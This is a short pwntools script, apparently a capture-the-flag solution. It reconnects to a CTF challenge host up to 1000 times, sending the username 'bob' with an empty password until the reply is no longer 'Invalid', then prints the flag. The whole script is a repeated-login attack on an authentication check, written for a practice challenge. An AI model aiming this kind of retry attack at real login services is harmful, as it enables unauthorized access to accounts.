#!/usr/bin/python3

from pwn import *

REMOTE_IP = "pwn.ctf.secso.cc"
REMOTE_PORT = 5004

if args.ATTACH:
	gdb.attach(p, '''break main''')

for i in range(1000):
    p = remote(REMOTE_IP, REMOTE_PORT)
    p.recvlines(2)
    p.sendline('bob')
    p.recvline()
    p.sendline("")
    res = p.recvline()
    if not res.startswith(b"Invalid"):
        print(res)
        break
    p.sendline('f')
    p.close()

p.interactive()

# flag will be printed during last remote connection
